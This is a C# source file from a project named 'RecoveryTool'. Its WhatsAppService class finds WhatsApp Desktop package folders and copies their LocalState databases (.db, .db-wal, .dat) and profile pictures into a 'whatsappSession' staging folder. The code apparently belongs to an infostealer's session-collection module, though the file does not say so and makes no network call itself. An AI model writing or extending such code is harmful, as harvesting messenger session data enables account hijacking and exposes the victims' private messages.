using RecoveryTool.Recovery.Utilities;

namespace RecoveryTool.Recovery.Messenger
{
    public class WhatsAppService
    {
        public static async Task SaveWhatsAppAsync()
        {
            var regexPattern = @"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$";
            var parentFolders = Directory.GetDirectories(Common.LocalData, "Packages")
                                         .Where(d => MessengerHelper.ValidatePattern(Path.GetFileName(d), regexPattern))
                                         .ToList();

            if (parentFolders.Any())
            {
                string whatsappSession = Common.EnsureWhatsAppPath();

                foreach (var parentFolder in parentFolders)
                {
                    var localStateFolders = Directory.GetDirectories(parentFolder, "LocalState", SearchOption.AllDirectories);
                    foreach (var localStateFolder in localStateFolders)
                    {
                        var profilePicturesFolders = Directory.GetDirectories(localStateFolder, "profilePictures", SearchOption.AllDirectories);
                        foreach (var profilePicturesFolder in profilePicturesFolders)
                        {
                            string destinationPath = Path.Combine(whatsappSession, Path.GetFileName(localStateFolder), "profilePictures");
                            await MessengerHelper.CopyDirectoryAsync(profilePicturesFolder, destinationPath);
                        }

                        static bool filePredicate(FileInfo fi) =>
                            fi.Length <= 10 * 1024 * 1024 &&
                            (fi.Extension.Equals(".db", StringComparison.OrdinalIgnoreCase) ||
                             fi.Extension.Equals(".db-wal", StringComparison.OrdinalIgnoreCase) ||
                             fi.Extension.Equals(".dat", StringComparison.OrdinalIgnoreCase));

                        string destinationFolderPath = Path.Combine(whatsappSession, Path.GetFileName(localStateFolder));
                        await MessengerHelper.CopyFilesAsync(localStateFolder, destinationFolderPath, filePredicate);
                    }
                }
            }
        }
    }
}
